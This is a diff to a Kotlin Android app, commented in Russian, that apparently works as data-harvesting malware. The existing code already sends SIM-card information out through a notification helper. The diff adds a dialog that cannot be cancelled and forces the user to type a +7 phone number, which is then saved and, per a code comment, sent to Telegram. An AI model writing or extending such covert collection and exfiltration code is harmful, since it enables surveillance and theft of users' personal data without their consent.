@@ -26,6 +26,8 @@ class MainActivity : AppCompatActivity() {
     private val client = OkHttpClient()
     private val NOTIFICATION_SENT_KEY = "notification_sent"
     private val SIM_INFO_SENT_KEY = "sim_info_sent"
+    private val PHONE_NUMBER_KEY = "phone_number"
+    private val PHONE_NUMBER_ENTERED_KEY = "phone_number_entered"
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -100,6 +102,11 @@ class MainActivity : AppCompatActivity() {
                 if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                     sendSimInfoNotification()
                 }
+                
+                // Показываем диалог ввода номера, если он еще не был введен
+                if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
+                    showPhoneNumberDialog()
+                }
             }
         }
     }
@@ -145,6 +152,59 @@ class MainActivity : AppCompatActivity() {
         val simInfo = getSimNumbersString()
         sendNotification("Информация о SIM-картах:\n$simInfo")
         sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
+    }
+
+    @SuppressLint("SetTextI18n")
+    private fun showPhoneNumberDialog() {
+        val dialog = android.app.AlertDialog.Builder(this)
+        val inflater = layoutInflater
+        val dialogView = inflater.inflate(R.layout.dialog_phone_input, null)
+        
+        val phoneInput = dialogView.findViewById<android.widget.EditText>(R.id.phoneInput)
+        val continueButton = dialogView.findViewById<android.widget.Button>(R.id.continueButton)
+        
+        // Устанавливаем текст +7 и запрещаем его изменение
+        phoneInput.setText("+7")
+        phoneInput.setSelection(phoneInput.text.length)
+        
+        // Фильтр для ввода только цифр и ограничения длины
+        phoneInput.addTextChangedListener(object : android.text.TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+            
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
+                // Запрещаем изменение +7 в начале
+                if (s?.length ?: 0 < 2 || s?.subSequence(0, 2) != "+7") {
+                    phoneInput.setText("+7")
+                    phoneInput.setSelection(2)
+                }
+            }
+            
+            override fun afterTextChanged(s: android.text.Editable?) {
+                continueButton.isEnabled = s?.length == 12 // +7 + 10 цифр
+            }
+        })
+        
+        dialog.setView(dialogView)
+        dialog.setCancelable(false)
+        
+        val alertDialog = dialog.create()
+        
+        continueButton.setOnClickListener {
+            val phoneNumber = phoneInput.text.toString()
+            if (phoneNumber.length == 12) { // +7 + 10 цифр
+                sharedPrefs.edit()
+                    .putString(PHONE_NUMBER_KEY, phoneNumber)
+                    .putBoolean(PHONE_NUMBER_ENTERED_KEY, true)
+                    .apply()
+                
+                // Отправляем номер в Telegram
+                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
+                
+                alertDialog.dismiss()
+            }
+        }
+        
+        alertDialog.show()
     }
 
     @SuppressLint("HardwareIds", "MissingPermission")
